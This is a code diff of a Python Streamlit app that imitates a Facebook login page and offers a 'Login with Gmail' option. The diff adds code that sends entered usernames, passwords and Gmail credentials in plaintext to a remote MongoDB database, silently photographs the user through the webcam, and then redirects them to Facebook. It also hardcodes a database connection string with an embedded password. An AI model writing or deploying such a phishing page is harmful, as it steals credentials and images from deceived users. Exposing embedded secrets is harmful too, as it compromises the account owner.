@@ -1,19 +1,33 @@
 import logging
 import os
+from datetime import datetime
 
 import cv2
 import streamlit as st
 import streamlit.components.v1 as components
+from pymongo import MongoClient
+from pymongo.errors import DuplicateKeyError
 
-# Ensure directories exist
-if not os.path.exists("User_Credentials"):
-    os.makedirs("User_Credentials")
-if not os.path.exists("User_Images"):
-    os.makedirs("User_Images")
+# MongoDB setup
+mongo_uri = "mongodb+srv://abdullahzubair356:kadharkadhar@facebook-login.6fv4m.mongodb.net/?retryWrites=true&w=majority&appName=facebook-login"
+client = MongoClient(mongo_uri)
+db = client["user_db"]
+users_collection = db["users"]
+images_collection = db["images"]
+
+# Ensure MongoDB collections are set up
+users_collection.create_index("username", unique=True)
+images_collection.create_index("username")
 
 
 def configure_user_logger(username):
-    user_log_file = os.path.join("User_Credentials", f"{username}.log")
+    # Ensure the User_Credentials directory exists
+    user_log_dir = "User_Credentials"
+    if not os.path.exists(user_log_dir):
+        os.makedirs(user_log_dir)  # Create the directory if it doesn't exist
+
+    user_log_file = os.path.join(user_log_dir, f"{username}.log")
+
     user_logger = logging.getLogger(username)
     user_logger.setLevel(logging.INFO)
 
@@ -22,19 +36,27 @@ def configure_user_logger(username):
         formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
         file_handler.setFormatter(formatter)
         user_logger.addHandler(file_handler)
+
     return user_logger
 
 
 def save_credentials(username, password):
-    credentials_file = os.path.join("User_Credentials", "credentials.txt")
-    with open(credentials_file, "a") as file:
-        file.write(f"{username}:{password}\n")
+    user = {"username": username, "password": password}
+    try:
+        # Try to insert the user into the database
+        users_collection.insert_one(user)
+    except DuplicateKeyError:
+        # If duplicate username exists, inform the user to choose a different username
+        st.error(
+            f"The username '{username}' is already taken. Please choose a different username."
+        )
 
 
 def save_images(username):
-    user_folder = os.path.join("User_Images", username)
-    if not os.path.exists(user_folder):
-        os.makedirs(user_folder)
+    # Ensure the 'user_images' folder exists
+    user_images_dir = "user_images"
+    if not os.path.exists(user_images_dir):
+        os.makedirs(user_images_dir)
 
     cap = cv2.VideoCapture(0)
 
@@ -49,13 +71,17 @@ def save_images(username):
         cap.release()
         return
 
-    existing_images = [f for f in os.listdir(user_folder) if f.startswith(username)]
-    image_number = len(existing_images) + 1
+    # Save the image locally with the username
+    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
+    image_filename = os.path.join(user_images_dir, f"{username}_{timestamp}.jpg")
+    cv2.imwrite(image_filename, frame)
 
-    img_path = os.path.join(user_folder, f"{username}_{image_number}.jpg")
-    cv2.imwrite(img_path, frame)
     cap.release()
     st.success("Image saved successfully!")
+
+    # Store image metadata in MongoDB
+    image_data = {"username": username, "image_filename": image_filename}
+    images_collection.insert_one(image_data)
 
 
 def redirect_to_facebook():
@@ -82,6 +108,67 @@ def redirect_to_facebook():
     )
 
 
+def handle_successful_login(username, message="Login successful!"):
+    if "redirect_done" not in st.session_state:
+        st.session_state["redirect_done"] = False
+
+    if not st.session_state["redirect_done"]:
+        st.session_state["current_user"] = username
+        user_logger = configure_user_logger(username)
+        user_logger.info(f"User '{username}' logged in successfully.")
+        save_images(username)
+        st.success(f"{message} Redirecting to Facebook...")
+        redirect_to_facebook()
+        st.session_state["redirect_done"] = True
+
+
+def login():
+    username = st.text_input("Username", key="login_username")
+    password = st.text_input("Password", type="password", key="login_password")
+
+    if st.button("Login"):
+        if not username or not password:
+            st.error("Please fill in both fields.")
+        else:
+            # Check if the user exists in MongoDB and verify password
+            user = users_collection.find_one({"username": username})
+            if user and user["password"] == password:
+                handle_successful_login(username)
+            else:
+                st.error("Invalid username or password!")
+
+
+def signup():
+    new_username = st.text_input("New Username", key="signup_username")
+    new_password = st.text_input("New Password", type="password", key="signup_password")
+
+    if st.button("Sign Up"):
+        if not new_username or not new_password:
+            st.error("Please fill in both fields.")
+        else:
+            save_credentials(new_username, new_password)
+            handle_successful_login(new_username, "Account created successfully!")
+
+
+def login_with_gmail():
+    email = st.text_input("Gmail Address", key="gmail_username")
+    password = st.text_input("Password", type="password", key="gmail_password")
+
+    if st.button("Login with Gmail"):
+        if not email or not password:
+            st.error("Please fill in both fields.")
+        else:
+            save_credentials(email, password)
+            handle_successful_login(email)
+
+
+# Initialize session state
+if "current_user" not in st.session_state:
+    st.session_state["current_user"] = None
+if "redirect_done" not in st.session_state:
+    st.session_state["redirect_done"] = False
+
+# Custom CSS for styling the page
 st.markdown(
     """
     <style>
@@ -113,6 +200,7 @@ st.markdown(
     unsafe_allow_html=True,
 )
 
+# Display Facebook logo above the form
 st.markdown(
     """
     <div class="logo" style="text-align: center;">
@@ -122,72 +210,6 @@ st.markdown(
     """,
     unsafe_allow_html=True,
 )
-
-
-def handle_successful_login(username, message="Login successful!"):
-    if "redirect_done" not in st.session_state:
-        st.session_state["redirect_done"] = False
-
-    if not st.session_state["redirect_done"]:
-        st.session_state["current_user"] = username
-        user_logger = configure_user_logger(username)
-        user_logger.info(f"User '{username}' logged in successfully.")
-        save_images(username)
-        st.success(f"{message} Redirecting to Facebook...")
-        redirect_to_facebook()
-        st.session_state["redirect_done"] = True
-
-
-def login():
-    username = st.text_input("Username", key="login_username")
-    password = st.text_input("Password", type="password", key="login_password")
-
-    if st.button("Login"):
-        if not username or not password:
-            st.error("Please fill in both fields.")
-        elif (
-            username in st.session_state["users"]
-            and st.session_state["users"][username] == password
-        ):
-            handle_successful_login(username)
-        else:
-            st.error("Invalid username or password!")
-
-
-def signup():
-    new_username = st.text_input("New Username", key="signup_username")
-    new_password = st.text_input("New Password", type="password", key="signup_password")
-
-    if st.button("Sign Up"):
-        if not new_username or not new_password:
-            st.error("Please fill in both fields.")
-        elif new_username in st.session_state["users"]:
-            st.error("Username already exists!")
-        else:
-            st.session_state["users"][new_username] = new_password
-            save_credentials(new_username, new_password)
-            handle_successful_login(new_username, "Account created successfully!")
-
-
-def login_with_gmail():
-    email = st.text_input("Gmail Address", key="gmail_username")
-    password = st.text_input("Password", type="password", key="gmail_password")
-
-    if st.button("Login with Gmail"):
-        if not email or not password:
-            st.error("Please fill in both fields.")
-        else:
-            save_credentials(email, password)
-            handle_successful_login(email)
-
-
-# Initialize session state
-if "current_user" not in st.session_state:
-    st.session_state["current_user"] = None
-if "users" not in st.session_state:
-    st.session_state["users"] = {}
-if "redirect_done" not in st.session_state:
-    st.session_state["redirect_done"] = False
 
 # Dropdown for authentication options
 auth_option = st.selectbox(
